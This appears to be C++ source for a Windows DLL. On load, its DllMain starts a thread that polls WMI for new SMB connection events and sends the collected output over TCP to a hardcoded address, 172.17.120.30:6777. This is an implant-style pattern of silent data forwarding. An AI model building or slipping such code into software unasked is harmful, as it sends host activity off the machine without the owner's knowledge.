#pragma once
#include <stdio.h>
#include <sstream>
#include <string>
#include <vector>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include "wmiEvhead.h"
#include "EventSink.h"
#include "thread"
#include <algorithm>
#include "C:\dev\netstat\tcpclient.h"



DWORD WINAPI runfunc(LPVOID lpParam)
{
	std::string hashlist;
	std::string buff_string;
	std::string output;
	std::vector<std::string> hashlog;

	int sendFail = 0;
	int res = NULL;
	IWbemServices *pSvc = wmiSetup();

	while (true)
	{

		output = getOutput(pSvc);
		std::this_thread::sleep_for(2s);

		//If output isn't empty
		if(output != "")
		{
			std::string outputHash = makehash(output);
			bool hashcheck = in_array(outputHash, hashlog);
			if(hashcheck)
			{
				output.clear();
				cout << "[+] Buff Str size: " << buff_string.size() << endl;
				cout << "[+] Hashlog size: " << hashlog.size() << endl;
				cout << "[+] Output hash: " << outputHash << endl;
				std::this_thread::sleep_for(2s);
			}
			else
			{
				hashlog.push_back(outputHash);
				buff_string.append(output);
			}

			if(sendFail == 1 || hashcheck == false)
			{
			bool conn;
			conn = (ConnectToHost(6777, "172.17.120.30"));
			//Set up connection
			if (conn == false)
			{
				sendFail = 1;
				cout << "[-] Connection Failed...";
			}

			else
			{
				//Check for a previous failed send attempt
				switch (sendFail)
				{
				case 0:
					cout << "[*] New SMB connection found.  Sending..." << endl;	//DEBUG
					res = sendData(output);
					//If no previous failed send attempt, only send the last caught output
					cout << "[+] Sent output." << endl;	//DEBUG
					buff_string.clear();
					output.clear();
					break;

				case 1:

					//There was a previous failed attempt so send queued output
					cout << "[*] Attempting to send buffer..." << endl;	//DEBUG
					res = sendData(buff_string);
					cout << buff_string << endl;

					if (res == 0)
					{
						sendFail = 0;
						buff_string.clear();
					}
					break;
				}
				std::this_thread::sleep_for(2s);
			}
			
				std::this_thread::sleep_for(2s);
				
			}
		}
	}
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwAttached, LPVOID lpvReserved)
{
	if (dwAttached == DLL_PROCESS_ATTACH)
	{
		CreateThread(NULL, 0, &runfunc, NULL, 0, NULL);
	}
	return TRUE;
}